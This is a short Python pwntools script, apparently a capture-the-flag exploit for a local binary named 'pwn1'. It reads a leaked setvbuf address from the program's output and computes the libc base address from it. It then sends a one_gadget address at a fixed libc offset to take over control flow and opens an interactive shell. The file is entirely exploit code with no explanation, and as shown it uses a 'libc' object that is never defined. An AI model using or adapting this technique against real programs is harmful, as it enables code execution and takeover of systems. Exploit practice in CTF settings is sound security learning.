from pwn import *

proc = process("./pwn1")
proc.recvuntil(b"this: ")
leak = int(b"0x"+proc.recv()[:12], 16)
log.info("LEAK: "+hex(leak))
libc.address = leak-libc.sym['setvbuf']
log.info("Libc: "+hex(libc.address))
proc.sendline(hex(libc.address+0xe3b31)[2:])
proc.interactive()
